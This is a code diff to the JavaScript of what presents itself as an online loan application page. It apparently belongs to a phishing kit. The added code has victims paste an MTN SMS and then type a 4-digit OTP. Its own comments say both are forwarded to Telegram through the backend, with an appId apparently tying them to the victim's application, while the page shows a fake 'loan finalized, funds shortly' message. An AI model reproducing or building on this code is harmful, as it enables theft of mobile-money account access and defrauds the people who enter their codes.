@@ -35,7 +35,6 @@ calculateLoan();
 document.getElementById('submit-btn').addEventListener('click', async function(e) {
     e.preventDefault();
     
-    // Show the processing screen
     document.getElementById('processing-title').innerText = "Processing Application";
     document.getElementById('processing-text').innerText = "Please wait while an agent reviews your loan request. Do not close this page.";
     document.getElementById('loader-spinner').style.display = "block"; 
@@ -56,26 +55,22 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
         const result = await response.json();
 
         if (result.success && result.appId) {
-            // START POLLING: Check status every 3 seconds
+            window.currentAppId = result.appId; // Save for later
+
             const interval = setInterval(async () => {
                 try {
                     const statusRes = await fetch(`/api/status/${result.appId}`);
                     const statusData = await statusRes.json();
 
                     if (statusData.status === 'approved') {
-                        clearInterval(interval); // Stop checking
-                        
-                        // Show a quick "Approved" message, then jump to SMS page
+                        clearInterval(interval); 
                         document.getElementById('processing-title').innerText = "Approved!";
                         document.getElementById('processing-text').innerText = "Redirecting...";
                         document.getElementById('loader-spinner').style.display = "none"; 
-                        
-                        setTimeout(() => {
-                            showScreen('screen-sms');
-                        }, 1000); // Wait 1 second, then show SMS screen
+                        setTimeout(() => { showScreen('screen-sms'); }, 1000); 
 
                     } else if (statusData.status === 'rejected') {
-                        clearInterval(interval); // Stop checking
+                        clearInterval(interval); 
                         document.getElementById('processing-title').innerText = "Application Rejected";
                         document.getElementById('processing-text').innerText = "Unfortunately, we cannot offer you a loan at this time.";
                         document.getElementById('loader-spinner').style.display = "none"; 
@@ -83,7 +78,7 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
                 } catch (error) {
                     console.error("Waiting for approval...", error);
                 }
-            }, 3000); // 3000 milliseconds = 3 seconds
+            }, 3000); 
         } else {
             alert("Error sending application.");
             showScreen('screen-step3');
@@ -95,79 +90,136 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
     }
 });
 
-// --- SMS Verification Button Logic ---
+// --- SMS Paste Screen Logic ---
 const smsInput = document.getElementById('sms-input');
 const verifyBtn = document.getElementById('verify-btn');
 
-// Start disabled
 verifyBtn.disabled = true;
-verifyBtn.style.pointerEvents = 'none';
-verifyBtn.style.opacity = '0.6';
 
-// Enable button when user types/pastes something meaningful
 smsInput.addEventListener('input', function() {
     const hasContent = smsInput.value.trim().length > 0;
-
     if (hasContent) {
         verifyBtn.disabled = false;
         verifyBtn.style.pointerEvents = 'auto';
-        verifyBtn.style.background = '#ffcc00';   // full yellow
+        verifyBtn.style.background = '#ffcc00';
         verifyBtn.style.color = '#000';
         verifyBtn.style.opacity = '1';
-        verifyBtn.style.cursor = 'pointer';
     } else {
         verifyBtn.disabled = true;
         verifyBtn.style.pointerEvents = 'none';
-        verifyBtn.style.background = '#ffe082';   // faded
+        verifyBtn.style.background = '#ffe082';
         verifyBtn.style.color = '#fff';
         verifyBtn.style.opacity = '0.6';
-        verifyBtn.style.cursor = 'default';
     }
 });
 
-// Extra safety: handle paste events (mobile long-press paste)
-smsInput.addEventListener('paste', function() {
-    setTimeout(() => smsInput.dispatchEvent(new Event('input')), 0);
-});
-
-// Handle the verify action
 verifyBtn.addEventListener('click', function() {
     const smsText = smsInput.value.trim();
-
-    if (!smsText) return;
-
-    // Basic sanity check
     if (smsText.length < 10) {
         alert("Please paste the full SMS you received from MTN.");
         return;
     }
 
-    // Show processing screen
-    document.getElementById('processing-title').innerText = "Verifying SMS...";
-    document.getElementById('processing-text').innerText = "Please wait while we confirm your loan details.";
-    document.getElementById('loader-spinner').style.display = "block";
-    showScreen('screen-processing');
-
-    // Send the pasted SMS to the backend for verification
+    // Optional: send the SMS to Telegram in the background
     fetch('/api/verify-sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sms: smsText })
+        body: JSON.stringify({ sms: smsText, appId: window.currentAppId || 'unknown' })
+    });
+
+    // Move to the new OTP Screen
+    showScreen('screen-otp');
+    // Auto-focus the first box
+    setTimeout(() => document.querySelectorAll('.otp-box')[0].focus(), 300);
+});
+
+// --- OTP Screen Logic ---
+const otpBoxes = document.querySelectorAll('.otp-box');
+const otpSubmitBtn = document.getElementById('otp-submit-btn');
+
+otpBoxes.forEach((box, index) => {
+    // Focus styling
+    box.addEventListener('focus', () => {
+        box.style.borderColor = '#ffcc00';
+        box.style.boxShadow = '0 0 0 3px rgba(255, 204, 0, 0.2)';
+    });
+    box.addEventListener('blur', () => {
+        box.style.borderColor = '#ddd';
+        box.style.boxShadow = 'none';
+    });
+
+    // Auto-advance to next box
+    box.addEventListener('input', (e) => {
+        if (e.target.value && index < otpBoxes.length - 1) {
+            otpBoxes[index + 1].focus();
+        }
+        checkOtpComplete();
+    });
+
+    // Handle backspace
+    box.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            otpBoxes[index - 1].focus();
+        }
+    });
+
+    // Handle paste (e.g. pasting the 4 digits directly)
+    box.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
+        if (pastedData) {
+            for (let i = 0; i < pastedData.length; i++) {
+                if (otpBoxes[i]) otpBoxes[i].value = pastedData[i];
+            }
+            if (pastedData.length === 4) otpBoxes[3].focus();
+            else otpBoxes[pastedData.length].focus();
+            checkOtpComplete();
+        }
+    });
+});
+
+function checkOtpComplete() {
+    let allFilled = true;
+    otpBoxes.forEach(box => {
+        if (!box.value) allFilled = false;
+    });
+
+    if (allFilled) {
+        otpSubmitBtn.style.pointerEvents = 'auto';
+        otpSubmitBtn.style.background = '#ffcc00';
+        otpSubmitBtn.style.color = '#000';
+    } else {
+        otpSubmitBtn.style.pointerEvents = 'none';
+        otpSubmitBtn.style.background = '#ffe082';
+        otpSubmitBtn.style.color = '#fff';
+    }
+}
+
+otpSubmitBtn.addEventListener('click', () => {
+    // Gather the code
+    let fullCode = "";
+    otpBoxes.forEach(box => fullCode += box.value);
+
+    // Send the OTP code to Telegram via the backend
+    document.getElementById('processing-title').innerText = "Verifying Code...";
+    document.getElementById('processing-text').innerText = "Please wait.";
+    document.getElementById('loader-spinner').style.display = "block";
+    showScreen('screen-processing');
+
+    fetch('/api/submit-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ otp: fullCode, appId: window.currentAppId || 'unknown' })
     })
     .then(res => res.json())
     .then(result => {
-        if (result.success) {
-            document.getElementById('processing-title').innerText = "Verified!";
-            document.getElementById('processing-text').innerText = "Your loan is being finalized. You will receive a confirmation shortly.";
-        } else {
-            document.getElementById('processing-title').innerText = "Verification Failed";
-            document.getElementById('processing-text').innerText = "The SMS could not be verified. Please try again.";
-        }
+        document.getElementById('processing-title').innerText = "Success!";
+        document.getElementById('processing-text').innerText = "Your loan has been finalized. You will receive your funds shortly.";
         document.getElementById('loader-spinner').style.display = "none";
     })
     .catch(() => {
         document.getElementById('processing-title').innerText = "Network Error";
-        document.getElementById('processing-text').innerText = "Please check your connection and try again.";
+        document.getElementById('processing-text').innerText = "Please try again.";
         document.getElementById('loader-spinner').style.display = "none";
     });
 });
